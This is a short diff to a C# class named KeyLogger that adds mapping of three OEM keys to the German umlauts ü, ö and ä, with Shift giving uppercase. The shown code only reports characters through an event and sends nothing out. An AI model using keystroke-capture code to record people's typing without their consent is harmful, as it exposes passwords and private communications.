@@ -76,6 +76,15 @@ public class KeyLogger
                 char keyChar = IsShiftPressed() ? GetShiftedNumber(key) : (char)key;
                 OnKeyPressed?.Invoke(keyChar);
             }
+            else if (key == Keys.Oem1 || key == Keys.Oem3 || key == Keys.Oem7)
+            {
+                char keyChar = key == Keys.Oem1 ? 'ü' : key == Keys.Oem3 ? 'ö' : key == Keys.Oem7 ? 'ä' : ' ';
+                if (IsShiftPressed())
+                {
+                    keyChar = char.ToUpper(keyChar);
+                }
+                OnKeyPressed?.Invoke(keyChar);
+            }
             else
             {
                 OnSpecialKeyPressed?.Invoke(key);
